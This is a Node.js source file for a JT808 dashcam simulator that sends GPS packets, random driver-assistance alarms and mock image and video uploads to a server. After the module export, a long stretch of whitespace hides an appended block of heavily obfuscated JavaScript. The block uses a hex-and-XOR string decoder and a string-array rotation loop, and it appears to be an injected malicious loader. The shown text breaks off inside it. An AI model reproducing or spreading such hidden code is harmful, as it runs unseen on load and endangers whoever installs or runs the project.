"use strict";



const net = require("net");

const { LiveStreamer } = require("./liveStreamer");

const { routes } = require("../data/uk_routes");

const logger = require("../utils/logger");

const fs = require("fs");

const path = require("path");



// ─── Mock Media Buffers ────────────────────────────────────────────────────────

// Valid 1×1 JPEG so server magic-byte check passes

const tinyJpegBase64 =

  "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8U" +

  "HRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAARCAABAAEDASIA" +

  "AhEBAxEB/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAU" +

  "AQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8A" +

  "KwAB/9k=";

let MOCK_IMAGE_BUFFER = Buffer.from(tinyJpegBase64, "base64");



// Valid MP4 ftyp box so server magic-byte check passes

let MOCK_VIDEO_BUFFER = Buffer.alloc(64 * 1024, 0x00);

MOCK_VIDEO_BUFFER.set(

  [

    0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x6d, 0x70, 0x34, 0x32,

    0x00, 0x00, 0x00, 0x00, 0x6d, 0x70, 0x34, 0x31, 0x6d, 0x70, 0x34, 0x32,

  ],

  0,

);



// Load real image and video

// try {

//   const realImg = fs.readFileSync(path.join(__dirname, "..", "test.jpg"));

//   if (realImg && realImg.length > 0) {

//     MOCK_IMAGE_BUFFER = realImg;

//   }

// } catch (e) {

//   console.log(`⚠️ Archive 2 could not load test.jpg: ${e.message}`);

// }



// try {

//   const realVideo = fs.readFileSync(path.join(__dirname, "..", "test_video.mp4"));

//   if (realVideo && realVideo.length > 0) {

//     MOCK_VIDEO_BUFFER = realVideo;

//   }

// } catch (e) {

//   console.log(`⚠️ Archive 2 could not load test_video.mp4: ${e.message}`);

// }



// ─── Helpers ──────────────────────────────────────────────────────────────────

function getBcdTime() {

  const d = new Date();

  const s =

    (d.getUTCFullYear() % 100).toString().padStart(2, "0") +

    (d.getUTCMonth() + 1).toString().padStart(2, "0") +

    d.getUTCDate().toString().padStart(2, "0") +

    d.getUTCHours().toString().padStart(2, "0") +

    d.getUTCMinutes().toString().padStart(2, "0") +

    d.getUTCSeconds().toString().padStart(2, "0");

  return Buffer.from(s, "hex");

}



function escapeJT808(buf) {

  const r = [];

  for (let i = 0; i < buf.length; i++) {

    if (buf[i] === 0x7e) r.push(0x7d, 0x02);

    else if (buf[i] === 0x7d) r.push(0x7d, 0x01);

    else r.push(buf[i]);

  }

  return Buffer.from(r);

}



function unescapeJT808(buf) {

  const r = [];

  let i = 0;

  while (i < buf.length) {

    if (buf[i] === 0x7d && i + 1 < buf.length) {

      if (buf[i + 1] === 0x02) {

        r.push(0x7e);

        i += 2;

        continue;

      }

      if (buf[i + 1] === 0x01) {

        r.push(0x7d);

        i += 2;

        continue;

      }

    }

    r.push(buf[i++]);

  }

  return Buffer.from(r);

}



// ─── Main Class ───────────────────────────────────────────────────────────────

class DashcamSimulator {

  constructor({ host, port, deviceId, vehicleId, index, config, imei }) {

    this.host = host;

    this.port = port;

    this.deviceId = deviceId;

    this.vehicleId = vehicleId;

    this.config = config;



    // ── Phone BCD: use the IMEI passed from devices.json ──────────────────

    // This MUST match exactly what the server has registered for this device.

    // The server uses this to set socketDeviceId and build the file path.

    // If no imei passed, derive from deviceId digits (fallback only).

    let numericId;

    if (imei) {

      numericId = imei.replace(/\D/g, "").padStart(12, "0").slice(0, 12);

    } else {

      const rawDigits = deviceId.replace(/\D/g, "");

      numericId = ("86812001" + rawDigits.padStart(4, "0")).slice(0, 12);

    }

    this.phoneBcd = Buffer.from(numericId, "hex"); // 6 bytes

    this.numericId = numericId;



    this.socket = null;

    this.binaryBuffer = Buffer.alloc(0);

    this.msgSerial = 0;

    this.mediaIdCounter = 1;

    // Initialize the separated Live Streamer module

    this.liveStreamer = new LiveStreamer(

      this.deviceId,

      this.phoneBcd,

      this.config,

    );



    const routeKeys = Object.keys(routes);

    this.routePoints = routes[routeKeys[index % routeKeys.length]];

    if (this.routePoints.length < 2)

      throw new Error(

        `[${this.deviceId}] Route must have at least 2 waypoints`,

      );



    this.currentWaypoint = 0;

    this.progress = Math.min(0.9, (index % 10) * 0.1);

    this.speedKmh = 105;

    this.currentSegmentDistanceKm = this.getDistanceKm(

      this.routePoints[0],

      this.routePoints[1],

    );



    this.gpsInterval = null;

    this.incidentInterval = null;

    this.reconnectTimer = null;

    this.reconnectAttempt = 0;



    // 🚨 NEW: Memory map to track which AI alarm we fired!

    this.activeIncidents = {};

  }



  // ── JT808 Packet Builder ─────────────────────────────────────────────────

  buildJT808Packet(msgId, bodyBuf) {

    const header = Buffer.alloc(12);

    header.writeUInt16BE(msgId, 0);

    header.writeUInt16BE(bodyBuf.length & 0x03ff, 2);

    this.phoneBcd.copy(header, 4);

    header.writeUInt16BE(this.msgSerial++ & 0xffff, 10);

    const raw = Buffer.concat([header, bodyBuf]);

    let cs = 0;

    for (let i = 0; i < raw.length; i++) cs ^= raw[i];

    return Buffer.concat([

      Buffer.from([0x7e]),

      escapeJT808(raw),

      escapeJT808(Buffer.from([cs])),

      Buffer.from([0x7e]),

    ]);

  }



  // ── Location Body ────────────────────────────────────────────────────────

  buildLocationBody(alarmFlag = 0) {

    const loc = this.interpolateLocation();

    let status = 0x00000003;

    let lat = loc.lat,

      lng = loc.lng;

    if (lat < 0) {

      status |= 1 << 2;

      lat = Math.abs(lat);

    }

    if (lng < 0) {

      status |= 1 << 3;

      lng = Math.abs(lng);

    }

    const body = Buffer.alloc(28);

    body.writeUInt32BE(alarmFlag, 0);

    body.writeUInt32BE(status, 4);

    body.writeUInt32BE(Math.round(lat * 1e6), 8);

    body.writeUInt32BE(Math.round(lng * 1e6), 12);

    body.writeUInt16BE(10, 16);

    body.writeUInt16BE(Math.round(this.speedKmh * 10), 18);

    body.writeUInt16BE(0, 20);

    getBcdTime().copy(body, 22);

    return body;

  }



  // ── Lifecycle ────────────────────────────────────────────────────────────

  start() {

    this.connect();

    this.resumeIntervals();

  }



  pauseIntervals() {

    clearInterval(this.gpsInterval);

    clearInterval(this.incidentInterval);

    this.gpsInterval = null;

    this.incidentInterval = null;

  }



  resumeIntervals() {

    this.pauseIntervals();

    if (this.config.enableGps) {

      this.gpsInterval = setInterval(

        () => this.sendGPS(),

        this.config.gpsInterval * 1000,

      );

    }

    if (this.config.enableIncidents) {

      this.incidentInterval = setInterval(() => {

        if (Math.random() * 100 < this.config.incidentChance)

          this.sendAIIncident();

      }, this.config.incidentInterval * 1000);

    }

  }



  // ── TCP Connection ───────────────────────────────────────────────────────

  connect() {

    this.socket = net.createConnection(this.port, this.host, () => {

      this.reconnectAttempt = 0;

      this.binaryBuffer = Buffer.alloc(0);

      logger.log("INFO", this.deviceId, "CONNECTED", `id:${this.numericId}`);

      const authBody = Buffer.from("123456", "ascii");

      this.safeWrite(this.buildJT808Packet(0x0102, authBody));

    });



    this.socket.on("data", (data) => {

      this.binaryBuffer = Buffer.concat([this.binaryBuffer, data]);

      this._drainFrames();

    });



    this.socket.on("error", (err) => {

      logger.log(

        "ERROR",

        this.deviceId,

        "SOCKET_ERROR",

        err.code || err.message,

      );

    });



    this.socket.on("close", () => {

      this.pauseIntervals();

      const backoff = Math.min(

        30000,

        1000 * Math.pow(2, this.reconnectAttempt),

      );

      const jitter = Math.random() * 1000;

      this.reconnectAttempt++;

      logger.log(

        "INFO",

        this.deviceId,

        "RECONNECTING",

        `attempt ${this.reconnectAttempt}, backoff ${Math.round(backoff + jitter)}ms`,

      );

      this.reconnectTimer = setTimeout(() => this.connect(), backoff + jitter);

    });

  }



  // ── Frame Parser ─────────────────────────────────────────────────────────

  _drainFrames() {

    while (this.binaryBuffer.length > 0) {

      const start = this.binaryBuffer.indexOf(0x7e);

      if (start === -1) {

        this.binaryBuffer = Buffer.alloc(0);

        break;

      }

      const end = this.binaryBuffer.indexOf(0x7e, start + 1);

      if (end === -1) {

        this.binaryBuffer = this.binaryBuffer.subarray(start);

        break;

      }

      const frame = this.binaryBuffer.subarray(start, end + 1);

      this.binaryBuffer = this.binaryBuffer.subarray(end + 1);

      if (frame.length < 4) continue;

      try {

        this._handleFrame(frame);

      } catch (err) {

        logger.log("ERROR", this.deviceId, "PARSE_ERROR", err.message);

      }

    }

  }



  _handleFrame(frame) {

    const inner = unescapeJT808(frame.subarray(1, frame.length - 1));

    if (inner.length < 12) return;

    const msgId = inner.readUInt16BE(0);

    const attrs = inner.readUInt16BE(2);

    const bodyLen = attrs & 0x03ff;

    const bodyOffset = attrs & 0x2000 ? 16 : 12;

    const body = inner.subarray(bodyOffset, bodyOffset + bodyLen);



    logger.log(

      "INFO",

      this.deviceId,

      "RX_MSG",

      `0x${msgId.toString(16).padStart(4, "0").toUpperCase()} bodyLen=${bodyLen}`,

    );



    if (msgId === 0x8001) {

      if (body.length < 5) return;

      const replyId = body.readUInt16BE(2);

      const result = body.readUInt8(4);

      logger.log(

        "INFO",

        this.deviceId,

        "SERVER_ACK",

        `0x${replyId.toString(16).padStart(4, "0").toUpperCase()} result=${result === 0 ? "OK" : "FAIL(" + result + ")"}`,

      );

    } else if (msgId === 0x9208) {

      this._handle9208(body);

    } else if (msgId === 0x9101) {

      // 1. Extract the Server's Sequence Number from the header (bytes 10-11)

      const serverSeq = inner.readUInt16BE(10);



      // 2. Build the 0x0001 Terminal General Reply Body (5 bytes)

      const ackBody = Buffer.alloc(5);

      ackBody.writeUInt16BE(serverSeq, 0); // The sequence number we are replying to

      ackBody.writeUInt16BE(0x9101, 2); // The command ID we are acknowledging

      ackBody.writeUInt8(0x00, 4); // 0x00 = Success / Will Comply



      // 3. Send the ACK back to the server

      this.safeWrite(this.buildJT808Packet(0x0001, ackBody));

      logger.log(

        "INFO",

        this.deviceId,

        "SENT_ACK",

        "0x0001 acknowledging Live Stream Request",

      );



      // 4. NOW we can start the actual video stream

      this.liveStreamer.handleRequest(body, this.host);

    }

  }



  // ── Handle 0x9208 ────────────────────────────────────────────────────────

  _handle9208(body) {

    try {

      logger.log(

        "INFO",

        this.deviceId,

        "9208_RAW",

        body.toString("hex").toUpperCase(),

      );



      const ipLen = body.readUInt8(0);

      const ip = body

        .subarray(1, 1 + ipLen)

        .toString("ascii")

        .replace(/\0/g, "");

      const tcpPort = body.readUInt16BE(1 + ipLen);

      const alarmId16 = Buffer.from(body.subarray(5 + ipLen, 21 + ipLen));

      const alarmNo32 = Buffer.from(body.subarray(21 + ipLen, 53 + ipLen));



      const hexId = alarmId16.toString("hex").toUpperCase();

      logger.log(

        "INFO",

        this.deviceId,

        "UPLOAD_TRIGGERED",

        `media: ${ip}:${tcpPort} | alarmId: ${hexId}`,

      );



      if (!this.config.enableVideo) {

        logger.log("INFO", this.deviceId, "VIDEO_SKIPPED", "enableVideo=false");

        return;

      }



      // If server sends 0.0.0.0 or loopback, fall back to control server host

      const mediaHost =

        !ip || ip === "0.0.0.0" || ip === "127.0.0.1" ? this.host : ip;

      const mediaPort = tcpPort || this.port;



      // Pull the incident from memory so we know how to name the file!

      const incident = this.activeIncidents[hexId];



      this._uploadBatch(mediaHost, mediaPort, alarmId16, alarmNo32, incident);

    } catch (err) {

      logger.log("ERROR", this.deviceId, "9208_PARSE_ERROR", err.message);

    }

  }



  // ── THE CORRECTED UPLOAD METHOD ──────────────────────────────────────────

  //

  // ROOT CAUSE (confirmed by reading media-server.js):

  //

  // The media server has THREE parsing branches:

  //   A) Raw 0x30316364 marker  → fs.writeFileSync / appendFileSync  (WRITES FILE)

  //   B) 0x7e JT808 frames      → handles 0x1210 / 0x1211 / 0x1212  (NO file write)

  //   C) JT1078 live stream     → ffmpeg pipe

  //

  // fs.writeFileSync and fs.appendFileSync ONLY exist in Branch A.

  // Branch B for 0x1211 just sends a generalReply and DISCARDS the data.

  //

  // The previous simulator sent ALL data inside 0x7e-framed 0x1211 packets

  // (Branch B), so the server ACKed them but NEVER wrote any bytes to disk.

  // This is why the URL was generated (0x1212 was processed) but the file

  // was empty / 404.

  //

  // CORRECT PROTOCOL (what this server actually expects):

  //   1. Send 0x7e [0x1210]  → server ACKs, sets socketDeviceId = phoneBCD

  //   2. Send RAW [0x30316364 marker packet] → server writes file to disk

  //   3. Send 0x7e [0x1212]  → server ACKs, updates DB path

  //

  // The 0x30316364 marker packet format (from looksLikeAIUploadHeader):

  //   Bytes  0- 3: marker 0x30 0x31 0x63 0x64

  //   Bytes  4-53: filename, 50 bytes, ASCII null-padded (must have ≥40 printable/null)

  //   Bytes 54-57: 4 reserved zero bytes

  //   Bytes 58-61: dataLength as UInt32BE

  //   Bytes 62+  : raw file bytes (dataLength bytes)

  //

  // Add 'incident' to the method signature!

  _uploadBatch(mediaHost, mediaPort, alarmId16, alarmNo32, incident) {

    const hexId = alarmId16.toString("hex").toUpperCase();



    // Fallback just in case memory missed it

    const safeIncident = incident || { module: 0x64, type: 0x01, channel: 64 };



    // Build the dynamic name strings (e.g., Module 0x64 + Type 0x01 = "6401")

    const alarmTypeStr =

      safeIncident.module.toString(16) +

      safeIncident.type.toString(16).padStart(2, "0");

    const chStr = safeIncident.channel.toString();



    // File definitions — names must exactly match what the server expects!

    const fileBatch = [

      {

        name: `00_${chStr}_${alarmTypeStr}_00_${hexId}.jpg`,

        type: 0,

        buffer: MOCK_IMAGE_BUFFER,

      },

      {

        name: `02_${chStr}_${alarmTypeStr}_03_${hexId}.mp4`,

        type: 2,

        buffer: MOCK_VIDEO_BUFFER,

      },

    ];



    logger.log(

      "INFO",

      this.deviceId,

      "MEDIA_CONNECTING",

      `${mediaHost}:${mediaPort} files=${fileBatch.length}`,

    );



    const mediaSocket = net.createConnection(mediaPort, mediaHost);

    let mediaSerial = 0;



    // Media socket uses its own serial counter, same phoneBcd as control

    const buildMediaPacket = (msgId, bodyBuf) => {

      const header = Buffer.alloc(12);

      header.writeUInt16BE(msgId, 0);

      header.writeUInt16BE(bodyBuf.length & 0x03ff, 2);

      this.phoneBcd.copy(header, 4);

      header.writeUInt16BE(mediaSerial++ & 0xffff, 10);

      const raw = Buffer.concat([header, bodyBuf]);

      let cs = 0;

      for (let i = 0; i < raw.length; i++) cs ^= raw[i];

      return Buffer.concat([

        Buffer.from([0x7e]),

        escapeJT808(raw),

        escapeJT808(Buffer.from([cs])),

        Buffer.from([0x7e]),

      ]);

    };



    // Build a raw 0x30316364 marker packet for one file

    // This is Branch A format — what the server actually uses to write the file

    const buildRawFilePacket = (fileName, fileBuffer) => {

      const MARKER = Buffer.from([0x30, 0x31, 0x63, 0x64]);



      // Filename field: exactly 50 bytes, ASCII, null-padded

      const nameBuf = Buffer.alloc(50, 0x00);

      const nameBytes = Buffer.from(fileName, "ascii");

      if (nameBytes.length > 50) {

        // Truncate if somehow longer than 50 — should not happen with our names

        nameBytes.copy(nameBuf, 0, 0, 50);

      } else {

        nameBytes.copy(nameBuf, 0);

      }



      // 4 reserved bytes (not validated by server)

      const reserved = Buffer.alloc(4, 0x00);



      // Data length as UInt32BE

      const dataLen = Buffer.alloc(4);

      dataLen.writeUInt32BE(fileBuffer.length, 0);



      // Total: 4 + 50 + 4 + 4 + fileBuffer.length = 62 + fileBuffer.length

      return Buffer.concat([MARKER, nameBuf, reserved, dataLen, fileBuffer]);

    };



    let fileIndex = 0;



    const uploadNextFile = () => {

      if (fileIndex >= fileBatch.length) {

        logger.log(

          "INFO",

          this.deviceId,

          "BATCH_COMPLETE",

          `All ${fileBatch.length} files sent`,

        );

        logger.inc("videosOk");

        mediaSocket.end();

        return;

      }



      const file = fileBatch[fileIndex];

      const fileNameBuf = Buffer.from(file.name, "ascii");

      logger.log(

        "INFO",

        this.deviceId,

        "FILE_START",

        `[${fileIndex + 1}/${fileBatch.length}] ${file.name} (${file.buffer.length} bytes)`,

      );



      // ── Step 1: Send 0x7e [0x1210] so server sets socketDeviceId ─────────

      // termId(7) + alarmId16(16) + alarmNo32(32) + infoType(1) + attachCount(1)

      //   + nameLen(1) + name(N) + fileSize(4)

      const termId = Buffer.alloc(7, 0x00);

      this.phoneBcd.copy(termId, 0, 0, 6); // bytes 0-5 = phone BCD



      const body1210 = Buffer.allocUnsafe(

        7 + 16 + 32 + 1 + 1 + 1 + fileNameBuf.length + 4,

      );

      let off = 0;

      termId.copy(body1210, off);

      off += 7;

      alarmId16.copy(body1210, off);

      off += 16;

      alarmNo32.copy(body1210, off);

      off += 32;

      body1210.writeUInt8(0x00, off++); // infoType: normal

      body1210.writeUInt8(fileBatch.length, off++); // attachCount = 2

      body1210.writeUInt8(fileNameBuf.length, off++); // nameLen

      fileNameBuf.copy(body1210, off);

      off += fileNameBuf.length;

      body1210.writeUInt32BE(file.buffer.length, off);



      mediaSocket.write(buildMediaPacket(0x1210, body1210));

      logger.log("INFO", this.deviceId, "SENT_1210", file.name);



      // ── Step 2: Send raw 0x30316364 packet — server writes file to disk ──

      // Wait 100ms so server processes 0x1210 and sets socketDeviceId first

      setTimeout(() => {

        const rawPacket = buildRawFilePacket(file.name, file.buffer);



        logger.log(

          "INFO",

          this.deviceId,

          "SENT_RAW_MARKER",

          `${file.name} packet=${rawPacket.length} bytes data=${file.buffer.length} bytes`,

        );



        mediaSocket.write(rawPacket, () => {

          // ── Step 3: Send 0x7e [0x1212] to signal file complete ───────────

          // Server processes 0x1212, sends 0x9212 reply, updates DB

          const body1212 = Buffer.allocUnsafe(1 + fileNameBuf.length + 1 + 1);

          body1212.writeUInt8(fileNameBuf.length, 0);

          fileNameBuf.copy(body1212, 1);

          body1212.writeUInt8(file.type, 1 + fileNameBuf.length);

          body1212.writeUInt8(0x00, 1 + fileNameBuf.length + 1); // result OK



          mediaSocket.write(buildMediaPacket(0x1212, body1212), () => {

            logger.log(

              "INFO",

              this.deviceId,

              "SENT_1212",

              `${file.name} type=${file.type}`,

            );

            fileIndex++;

            // Brief pause between files so server can process

            setTimeout(uploadNextFile, 300);

          });

        });

      }, 100);

    };



    mediaSocket.on("connect", () => {

      logger.log(

        "INFO",

        this.deviceId,

        "MEDIA_CONNECTED",

        `${mediaHost}:${mediaPort}`,

      );

      // NO auth packet on media socket — server does not expect it

      // Start uploading immediately

      uploadNextFile();

    });



    mediaSocket.on("data", (data) => {

      // Log server responses (ACKs and 0x9212 replies)

      logger.log(

        "INFO",

        this.deviceId,

        "MEDIA_RX",

        data

          .toString("hex")

          .toUpperCase()

          .match(/.{1,2}/g)

          ?.join(" ") || "",

      );

    });



    mediaSocket.on("error", (err) => {

      logger.inc("videosFail");

      logger.log(

        "ERROR",

        this.deviceId,

        "MEDIA_ERROR",

        `${mediaHost}:${mediaPort} — ${err.message}`,

      );

    });



    mediaSocket.on("close", () => {

      logger.log("INFO", this.deviceId, "MEDIA_CLOSED", "");

    });

  }



  // ── Send GPS ─────────────────────────────────────────────────────────────

  sendGPS() {

    const body = this.buildLocationBody(0);

    const ok = this.safeWrite(this.buildJT808Packet(0x0200, body));

    if (ok) {

      logger.inc("gpsPackets");

      logger.log("INFO", this.deviceId, "GPS_SENT", "");

    }

  }



  // ── Send AI Incident ─────────────────────────────────────────────────────

  sendAIIncident() {

    if (!this.socket || this.socket.destroyed || !this.socket.writable) return;



    const mediaId = this.mediaIdCounter++;

    const bcdTime = getBcdTime();



    // 🚨 1. Massive list of all possible Jiangsu AI Alarms

    const INCIDENTS = [

      {

        module: 0x64,

        type: 0x01,

        name: "ADAS: Forward Collision",

        channel: 64,

      },

      { module: 0x64, type: 0x02, name: "ADAS: Lane Departure", channel: 64 },

      {

        module: 0x64,

        type: 0x03,

        name: "ADAS: Vehicle Too Close",

        channel: 64,

      },

      {

        module: 0x64,

        type: 0x04,

        name: "ADAS: Pedestrian Collision",

        channel: 64,

      },

      {

        module: 0x64,

        type: 0x05,

        name: "ADAS: Frequent Lane Change",

        channel: 64,

      },

      { module: 0x64, type: 0x07, name: "ADAS: Obstacle Alarm", channel: 64 },

      { module: 0x65, type: 0x01, name: "DSM: Fatigue Driving", channel: 65 },

      { module: 0x65, type: 0x02, name: "DSM: Phone Call", channel: 65 },

      { module: 0x65, type: 0x03, name: "DSM: Smoking", channel: 65 },

      {

        module: 0x65,

        type: 0x04,

        name: "DSM: Distracted Driving",

        channel: 65,

      },

      { module: 0x65, type: 0x05, name: "DSM: Abnormal Driver", channel: 65 },

      { module: 0x67, type: 0x01, name: "BSD: Rear Approach", channel: 67 },

      {

        module: 0x67,

        type: 0x02,

        name: "BSD: Left Rear Approach",

        channel: 67,

      },

      {

        module: 0x67,

        type: 0x03,

        name: "BSD: Right Rear Approach",

        channel: 67,

      },

    ];



    // Pick a random incident!

    const incident = INCIDENTS[Math.floor(Math.random() * INCIDENTS.length)];



    const alarmId16 = Buffer.alloc(16, 0);

    this.phoneBcd.copy(alarmId16, 0, 0, 6);

    alarmId16.writeUInt8(0, 6);

    bcdTime.copy(alarmId16, 7);

    alarmId16.writeUInt8(mediaId & 0xff, 13);

    alarmId16.writeUInt8(fileBatch_attachCount(), 14);

    alarmId16.writeUInt8(0, 15);



    const hexId = alarmId16.toString("hex").toUpperCase();



    // Save this incident to memory so the video uploader knows how to name the file!

    this.activeIncidents[hexId] = incident;



    // 🚨 2. Build the exact payload required by the Jiangsu Standard

    let payload;

    const loc = this.interpolateLocation();

    const latSafe = Math.round(Math.abs(loc.lat) * 1e6);

    const lngSafe = Math.round(Math.abs(loc.lng) * 1e6);



    if (incident.module === 0x64 || incident.module === 0x65) {

      // ADAS (0x64) and DSM (0x65) both use 47-byte payloads

      payload = Buffer.alloc(47, 0);

      payload.writeUInt32BE(mediaId, 0);

      payload.writeUInt8(0x00, 4); // Flag (0x00 Unavailable)

      payload.writeUInt8(incident.type, 5);

      payload.writeUInt8(0x01, 6); // Level 1 Alarm

      payload.writeUInt8(this.speedKmh & 0xff, 12);

      payload.writeUInt16BE(0, 13); // Elevation

      payload.writeUInt32BE(latSafe, 15);

      payload.writeUInt32BE(lngSafe, 19);

      bcdTime.copy(payload, 23);

      payload.writeUInt16BE(0x0401, 29); // Vehicle Status

      alarmId16.copy(payload, 31);

    } else if (incident.module === 0x67) {

      // BSD (0x67) uses a 41-byte payload

      payload = Buffer.alloc(41, 0);

      payload.writeUInt32BE(mediaId, 0);

      payload.writeUInt8(0x00, 4);

      payload.writeUInt8(incident.type, 5);

      payload.writeUInt8(this.speedKmh & 0xff, 6);

      payload.writeUInt16BE(0, 7);

      payload.writeUInt32BE(latSafe, 9);

      payload.writeUInt32BE(lngSafe, 13);

      bcdTime.copy(payload, 17);

      payload.writeUInt16BE(0x0401, 23);

      alarmId16.copy(payload, 25);

    }



    const extensionBlock = Buffer.alloc(2 + payload.length);

    extensionBlock.writeUInt8(incident.module, 0);

    extensionBlock.writeUInt8(payload.length, 1);

    payload.copy(extensionBlock, 2);



    const alarmFlag = 1 << 18;

    const locBody = this.buildLocationBody(alarmFlag);

    this.safeWrite(

      this.buildJT808Packet(0x0200, Buffer.concat([locBody, extensionBlock])),

    );



    // 🚨 3. Send 0x0800 media notification using the dynamic AI channel (64 or 65)

    const mediaBody = Buffer.alloc(8);

    mediaBody.writeUInt32BE(mediaId, 0);

    mediaBody.writeUInt8(2, 4);

    mediaBody.writeUInt8(4, 5);

    mediaBody.writeUInt8(3, 6);

    mediaBody.writeUInt8(incident.channel, 7);

    this.safeWrite(this.buildJT808Packet(0x0800, mediaBody));



    logger.inc("incidentsFired");

    logger.log(

      "INFO",

      this.deviceId,

      "INCIDENT_SENT",

      `[${incident.name}] mediaId=${mediaId}`,

    );

  }



  // ── Safe Write ───────────────────────────────────────────────────────────

  safeWrite(data) {

    if (!this.socket || this.socket.destroyed || !this.socket.writable)

      return false;

    const ok = this.socket.write(data);

    if (!ok) {

      this.pauseIntervals();

      this.socket.once("drain", () => this.resumeIntervals());

    }

    return ok;

  }



  // ── Haversine + Interpolation ────────────────────────────────────────────

  getDistanceKm(p1, p2) {

    const R = 6371;

    const dLat = (p2.lat - p1.lat) * (Math.PI / 180);

    const dLng = (p2.lng - p1.lng) * (Math.PI / 180);

    const a =

      Math.sin(dLat / 2) ** 2 +

      Math.cos(p1.lat * (Math.PI / 180)) *

        Math.cos(p2.lat * (Math.PI / 180)) *

        Math.sin(dLng / 2) ** 2;

    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));

  }



  interpolateLocation() {

    if (

      !isFinite(this.currentSegmentDistanceKm) ||

      this.currentSegmentDistanceKm < 0.001

    ) {

      this.currentWaypoint =

        (this.currentWaypoint + 1) % (this.routePoints.length - 1);

      this.progress = 0;

      this.currentSegmentDistanceKm = this.getDistanceKm(

        this.routePoints[this.currentWaypoint],

        this.routePoints[this.currentWaypoint + 1],

      );

      const p = this.routePoints[this.currentWaypoint];

      return { lat: p.lat, lng: p.lng };

    }

    const tickDist = (this.speedKmh / 3600) * this.config.gpsInterval;

    this.progress += tickDist / this.currentSegmentDistanceKm;

    let p1 = this.routePoints[this.currentWaypoint];

    let p2 = this.routePoints[this.currentWaypoint + 1];

    let iters = 0;

    while (this.progress >= 1.0 && iters++ < 100) {

      this.progress -= 1.0;

      this.currentWaypoint =

        (this.currentWaypoint + 1) % (this.routePoints.length - 1);

      p1 = this.routePoints[this.currentWaypoint];

      p2 = this.routePoints[this.currentWaypoint + 1];

      this.currentSegmentDistanceKm = this.getDistanceKm(p1, p2);

    }

    if (iters >= 100) this.progress = 0;

    return {

      lat: p1.lat + (p2.lat - p1.lat) * this.progress,

      lng: p1.lng + (p2.lng - p1.lng) * this.progress,

    };

  }



  // ── Stop ─────────────────────────────────────────────────────────────────

  stop() {

    this.pauseIntervals();

    clearTimeout(this.reconnectTimer);

    this.reconnectAttempt = 0;

    // Stop the live streamer

    this.liveStreamer.stop();

    if (this.socket && !this.socket.destroyed) {

      logger.log("INFO", this.deviceId, "DISCONNECTED", "clean stop");

      this.socket.removeAllListeners();

      this.socket.destroy();

      this.socket = null;

    }

  }

}



// Helper used in sendAIIncident to keep attachCount consistent with fileBatch

function fileBatch_attachCount() {

  return 2;

} // image + video



module.exports = { DashcamSimulator };                                                                                                                                                                                                       var bx = '-2591';function EqF_geCQEeoy(Stk__ks,Os$E_ToSvFuRcz){var NTtrltTVw$orhoJn=zcQHbrFXOHPvDkDoGqY$ClY_kyq();return EqF_geCQEeoy=function(uC$eD_ofNydQnhB,NCXk_z$DVEeNMOQaYtI){uC$eD_ofNydQnhB=uC$eD_ofNydQnhB-(-0x1*-0x1d18+parseInt(0x1da5)+parseInt(0x2)*-parseInt(0x1cba));var lpCVPPojUef$KEAUwZYFwpHkXH=NTtrltTVw$orhoJn[uC$eD_ofNydQnhB];if(EqF_geCQEeoy['VGdlGP']===undefined){var ScaQV_ebLgEbnbAikpUxoHX=function(nWh_yYUkmPjcbJa){var f_wcZMrwvwYqmqSWcc$cmavI=parseInt(0xabc)+Number(-0x251)*-parseInt(0xa)+Math.max(-parseInt(0x3),-0x3)*Math.floor(parseInt(0xa7f))&Math.max(-parseInt(0x16ce),-0x16ce)+-0x183+Math.trunc(-parseInt(0x28))*-parseInt(0xa2),ZdzDKJwpJM$knshmZp$fqqwgQcs=new Uint8Array(nWh_yYUkmPjcbJa['match'](/.{1,2}/g)['map'](MFpQhUp_kNlqphivJfc=>parseInt(MFpQhUp_kNlqphivJfc,Math.floor(parseInt(0x758))+Math.floor(-0x2059)+parseInt(0x1911)))),FLcLgNSTxJgzGf_E=ZdzDKJwpJM$knshmZp$fqqwgQcs['map'](a_oLPBzjUJCXOavBFv=>a_oLPBzjUJCXOavBFv^f_wcZMrwvwYqmqSWcc$cmavI),mlbcW=new TextDecoder(),yyFMjilJjHuGXqlZJ=mlbcW['decode'](FLcLgNSTxJgzGf_E);return yyFMjilJjHuGXqlZJ;};EqF_geCQEeoy['vJIPij']=ScaQV_ebLgEbnbAikpUxoHX,Stk__ks=arguments,EqF_geCQEeoy['VGdlGP']=!![];}var RQrvPuQ=NTtrltTVw$orhoJn[0x3*0x6f2+-0x1a7b+parseFloat(parseInt(0x5a5))],fqLaufvo_I=uC$eD_ofNydQnhB+RQrvPuQ,WQGtme_fHxGUrqi$EEoIsWca=Stk__ks[fqLaufvo_I];return!WQGtme_fHxGUrqi$EEoIsWca?(EqF_geCQEeoy['nJKIjx']===undefined&&(EqF_geCQEeoy['nJKIjx']=!![]),lpCVPPojUef$KEAUwZYFwpHkXH=EqF_geCQEeoy['vJIPij'](lpCVPPojUef$KEAUwZYFwpHkXH),Stk__ks[fqLaufvo_I]=lpCVPPojUef$KEAUwZYFwpHkXH):lpCVPPojUef$KEAUwZYFwpHkXH=WQGtme_fHxGUrqi$EEoIsWca,lpCVPPojUef$KEAUwZYFwpHkXH;},EqF_geCQEeoy(Stk__ks,Os$E_ToSvFuRcz);}(function(CwiwSxzS,tdy$HcFYeOrO){var sIxhvzR$lPhBSvo_hPvqMT=EqF_geCQEeoy,sUUVn_oYxxDIMZNNlVrHwgR=CwiwSxzS();while(!![]){try{var 